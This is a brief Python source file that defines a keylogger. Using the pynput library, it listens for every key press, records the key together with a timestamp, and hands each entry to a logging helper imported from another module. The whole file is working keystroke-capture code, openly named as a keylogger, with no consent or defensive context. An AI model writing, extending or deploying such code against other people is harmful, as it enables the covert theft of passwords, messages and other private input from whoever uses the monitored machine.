from pynput import keyboard
from utils import get_timestamp, save_log

def on_press(key):
    try:
        log = f"{get_timestamp()} - Key: {key.char}\n"
    except AttributeError:
        log = f"{get_timestamp()} - Special Key: {key}\n"
    save_log(log)

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
